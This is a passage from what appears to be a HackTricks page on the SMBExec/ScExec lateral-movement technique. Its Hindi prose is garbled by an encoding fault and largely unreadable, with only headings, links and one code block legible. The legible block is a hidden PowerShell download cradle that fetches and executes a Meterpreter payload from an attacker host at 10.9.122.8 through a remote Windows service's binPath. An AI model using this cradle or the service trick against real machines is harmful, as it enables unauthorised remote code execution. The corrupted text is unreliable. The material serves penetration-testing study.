# SmbExec/ScExec

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛ рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) **рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВ**.
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ.

</details>

## рдпрд╣ рдХреИрд╕реЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ

**Smbexec Psexec рдХреА рддрд░рд╣ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИред** рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ, рд╣рдо "_binpath_" рдХреЛ рдкреАрдбрд╝рд┐рдд рдХреЗ рдЕрдВрджрд░ рдХреЗ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓ рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░рдиреЗ рдХреЗ **рдмрдЬрд╛рдп**, рд╣рдо рдЗрд╕реЗ **cmd.exe рдпрд╛ powershell.exe** рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░реЗрдВрдЧреЗ рдФрд░ рдЙрдирдореЗрдВ рд╕реЗ рдПрдХ рдмреИрдХрдбреЛрд░ рдХреЛ рдбрд╛рдЙрдирд▓реЛрдб рдФрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧрд╛ред

## **SMBExec**

рдЖрдЗрдП рджреЗрдЦрддреЗ рд╣реИрдВ рдХрд┐ smbexec рдЪрд▓рдиреЗ рдкрд░ рдХреНрдпрд╛ рд╣реЛрддрд╛ рд╣реИ, рд╣рдорд▓рд╛рд╡рд░ рдФрд░ рд▓рдХреНрд╖реНрдп рдХреА рдУрд░ рд╕реЗ рдЗрд╕реЗ рджреЗрдЦрдХрд░:

![](../../.gitbook/assets/smbexec\_prompt.png)

рддреЛ рд╣рдо рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ рдпрд╣ "BTOBTO" рдирд╛рдордХ рдПрдХ рд╕реЗрд╡рд╛ рдмрдирд╛рддрд╛ рд╣реИред рд▓реЗрдХрд┐рди рдЬрдм рд╣рдо `sc query` рдХрд░рддреЗ рд╣реИрдВ рддреЛ рд╡рд╣ рд╕реЗрд╡рд╛ рд▓рдХреНрд╖реНрдп рдорд╢реАрди рдкрд░ рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реЛрддреА рд╣реИред рд╕рд┐рд╕реНрдЯрдо рд▓реЙрдЧреНрд╕ рдореЗрдВ рдЬреЛ рд╣реБрдЖ рдЙрд╕рдХрд╛ рд╕реБрд░рд╛рдЧ рдорд┐рд▓рддрд╛ рд╣реИ:

![](../../.gitbook/assets/smbexec\_service.png)

рд╕реЗрд╡рд╛ рдлрд╝рд╛рдЗрд▓ рдирд╛рдо рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдХрдорд╛рдВрдб рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╣реЛрддреА рд╣реИ (%COMSPEC% cmd.exe рдХреЗ рдкреВрд░реНрдг рдкрде рдХреЛ рдЗрдВрдЧрд┐рдд рдХрд░рддрд╛ рд╣реИ)ред рдпрд╣ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рдХрдорд╛рдВрдб рдХреЛ рдПрдХ рдмреИрдЯ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдЗрдХреЛ рдХрд░рддрд╛ рд╣реИ, stdout рдФрд░ stderr рдХреЛ рдПрдХ Temp рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд░рддрд╛ рд╣реИ, рдлрд┐рд░ рдмреИрдЯ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЙрд╕реЗ рд╣рдЯрд╛ рджреЗрддрд╛ рд╣реИред Kali рдкрд░ рд╡рд╛рдкрд╕, Python рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдлрд┐рд░ SMB рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЖрдЙрдЯрдкреБрдЯ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдЦреАрдВрдЪрддреА рд╣реИ рдФрд░ рд╣рдорд╛рд░реЗ "pseudo-shell" рдореЗрдВ рд╕рд╛рдордЧреНрд░реА рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рддреА рд╣реИред рд╣рдорд╛рд░реЗ "рд╢реЗрд▓" рдореЗрдВ рд╣рдо рдЬреЛ рднреА рдХрдорд╛рдВрдб рдЯрд╛рдЗрдк рдХрд░рддреЗ рд╣реИрдВ, рдПрдХ рдирдИ рд╕реЗрд╡рд╛ рдмрдирд╛рдИ рдЬрд╛рддреА рд╣реИ рдФрд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рджреЛрд╣рд░рд╛рдИ рдЬрд╛рддреА рд╣реИред рдЗрд╕реАрд▓рд┐рдП рдЗрд╕реЗ рдмрд╛рдЗрдирд░реА рдбреНрд░реЙрдк рдХрд░рдиреЗ рдХреА рдЬрд░реВрд░рдд рдирд╣реАрдВ рд╣реЛрддреА, рдпрд╣ рд╕рд┐рд░реНрдл рдкреНрд░рддреНрдпреЗрдХ рд╡рд╛рдВрдЫрд┐рдд рдХрдорд╛рдВрдб рдХреЛ рдПрдХ рдирдИ рд╕реЗрд╡рд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддрд╛ рд╣реИред рдирд┐рд╢реНрдЪрд┐рдд рд░реВрдк рд╕реЗ рдЕрдзрд┐рдХ рдЪреБрдкрдХреЗ рд╕реЗ, рд▓реЗрдХрд┐рди рдЬреИрд╕рд╛ рдХрд┐ рд╣рдордиреЗ рджреЗрдЦрд╛, рдкреНрд░рддреНрдпреЗрдХ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрдорд╛рдВрдб рдХреЗ рд▓рд┐рдП рдПрдХ рдЗрд╡реЗрдВрдЯ рд▓реЙрдЧ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдлрд┐рд░ рднреА рдПрдХ рдЧреИрд░-рдЗрдВрдЯрд░реИрдХреНрдЯрд┐рд╡ "рд╢реЗрд▓" рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдмрд╣реБрдд рд╣реА рдЪрддреБрд░ рддрд░реАрдХрд╛!

## рдореИрдиреБрдЕрд▓ SMBExec

**рдпрд╛ рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛**

рдЬреИрд╕рд╛ рдХрд┐ smbexec рдиреЗ рджрд┐рдЦрд╛рдпрд╛, рдмрд╛рдЗрдирд░реА рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЗ рдмрд┐рдирд╛ рд╕реАрдзреЗ рд╕реЗрд╡рд╛ binPaths рд╕реЗ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред рдпрджрд┐ рдЖрдкрдХреЛ рд▓рдХреНрд╖реНрдп Windows рдорд╢реАрди рдкрд░ рдХреЗрд╡рд▓ рдПрдХ рдордирдорд╛рдирд╛ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рддреЛ рдпрд╣ рдПрдХ рдЙрдкрдпреЛрдЧреА рдЪрд╛рд▓ рд╣реЛ рд╕рдХрддреА рд╣реИред рдПрдХ рддреНрд╡рд░рд┐рдд рдЙрджрд╛рд╣рд░рдг рдХреЗ рд░реВрдк рдореЗрдВ, рдЪрд▓рд┐рдП рдмрд┐рдирд╛ рдмрд╛рдЗрдирд░реА рдХреЗ рдПрдХ рд░рд┐рдореЛрдЯ рд╕реЗрд╡рд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ Meterpreter рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВред

рд╣рдо Metasploit рдХреЗ `web_delivery` рдореЙрдбреНрдпреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗ рдФрд░ рдПрдХ PowerShell рд▓рдХреНрд╖реНрдп рдХреЗ рд╕рд╛рде рдПрдХ рд░рд┐рд╡рд░реНрд╕ Meterpreter рдкреЗрд▓реЛрдб рдЪреБрдиреЗрдВрдЧреЗред рд▓рд┐рд╕рдирд░ рд╕реЗрдЯ рдЕрдк рд╣реИ рдФрд░ рдпрд╣ рд╣рдореЗрдВ рд▓рдХреНрд╖реНрдп рдорд╢реАрди рдкрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдорд╛рдВрдб рдмрддрд╛рддрд╛ рд╣реИ:
```
powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://10.9.122.8:8080/AZPLhG9txdFhS9n');
```
рд╣рдорд╛рд░реЗ Windows рдЕрдЯреИрдХ рдмреЙрдХреНрд╕ рд╕реЗ, рд╣рдо рдПрдХ рд░рд┐рдореЛрдЯ рд╕рд░реНрд╡рд┐рд╕ ("metpsh") рдмрдирд╛рддреЗ рд╣реИрдВ рдФрд░ binPath рдХреЛ рд╣рдорд╛рд░реЗ рдкреЗрд▓реЛрдб рдХреЗ рд╕рд╛рде cmd.exe рдХреЛ рдПрдХреНрдЬреАрдХреНрдпреВрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрдЯ рдХрд░рддреЗ рд╣реИрдВ:

![](../../.gitbook/assets/sc\_psh\_create.png)

рдФрд░ рдлрд┐рд░ рдЗрд╕реЗ рд╕реНрдЯрд╛рд░реНрдЯ рдХрд░рддреЗ рд╣реИрдВ:

![](../../.gitbook/assets/sc\_psh\_start.png)

рдпрд╣ рдПрд░рд░ рджрд┐рдЦрд╛рддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рд╣рдорд╛рд░реА рд╕рд░реНрд╡рд┐рд╕ рд░рд┐рд╕реНрдкреЙрдиреНрдб рдирд╣реАрдВ рдХрд░рддреА, рд▓реЗрдХрд┐рди рдЕрдЧрд░ рд╣рдо рд╣рдорд╛рд░реЗ Metasploit рд▓рд┐рд╕рдирд░ рдХреЛ рджреЗрдЦреЗрдВ рддреЛ рд╣рдореЗрдВ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИ рдХрд┐ рдХреЙрд▓рдмреИрдХ рд╣реБрдЖ рдФрд░ рдкреЗрд▓реЛрдб рдПрдХреНрдЬреАрдХреНрдпреВрдЯ рд╣реБрдЖред

рд╕рднреА рдЬрд╛рдирдХрд╛рд░реА рдпрд╣рд╛рдБ рд╕реЗ рдирд┐рдХрд╛рд▓реА рдЧрдИ рдереА: [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реБрд░реБрдЖрдд рд╕реЗ рд▓реЗрдХрд░ рдПрдХреНрд╕рдкрд░реНрдЯ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдЕрдЧрд░ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╢реЗрдпрд░ рдХрд░реЗрдВред

</details>
